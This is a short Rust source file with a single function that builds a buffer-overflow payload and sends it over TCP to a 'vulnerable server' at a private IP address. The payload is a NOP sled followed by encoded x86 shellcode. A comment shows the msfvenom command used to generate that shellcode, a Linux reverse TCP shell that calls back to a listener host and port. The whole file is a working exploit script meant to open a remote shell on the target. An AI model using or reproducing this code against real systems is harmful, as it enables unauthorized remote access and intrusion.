use std::net::TcpStream;
use std::io::Write;

pub fn start_reverse_shell_server() -> Result<(), String> {
    let target = "192.168.209.128:9999"; // Replace with the vulnerable server's address and port
    let mut payload = vec![0x90; 512]; // Larger NOP sled

    // msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.209.129 LPORT=4004 -e x86/shikata_ga_nai -f c
    // Add your reverse shell shellcode payload here
    payload.extend_from_slice(&[
        0xd9, 0xc1, 0xd9, 0x74, 0x24, 0xf4, 0x5b, 0xbd, 0x5a, 0x88, 0x3f, 0xb7, 0x31, 0xc9,
        0xb1, 0x12, 0x31, 0x6b, 0x17, 0x03, 0x6b, 0x17, 0x83, 0xb1, 0x74, 0xdd, 0x42, 0x74,
        0x5e, 0xd5, 0x4e, 0x25, 0x23, 0x49, 0xfb, 0xcb, 0x2a, 0x8c, 0x4b, 0xad, 0xe1, 0xcf,
        0x3f, 0x68, 0x4a, 0xf0, 0xf2, 0x0a, 0xe3, 0x76, 0xf4, 0x62, 0x34, 0x20, 0xd7, 0xf3,
        0xdc, 0x33, 0xd8, 0xfc, 0xb8, 0xbd, 0x39, 0xb2, 0xa7, 0xed, 0xe8, 0xe1, 0x94, 0x0d,
        0x82, 0xe4, 0x16, 0x91, 0xc6, 0x8e, 0xc6, 0xbd, 0x95, 0x26, 0x7f, 0xed, 0x76, 0xd4,
        0x16, 0x78, 0x6b, 0x4a, 0xba, 0xf3, 0x8d, 0xda, 0x37, 0xc9, 0xce
    ]);
    

    println!("[+] Connecting to target: {}", target);
    match TcpStream::connect(target) {
        Ok(mut stream) => {
            println!("[+] Connected. Sending payload...");
            if let Err(e) = stream.write_all(&payload) {
                return Err(format!("[-] Failed to send payload: {}", e));
            }
            println!("[+] Payload sent. Awaiting reverse shell...");
            Ok(())
        }
        Err(e) => Err(format!("[-] Could not connect to target: {}", e)),
    }
}
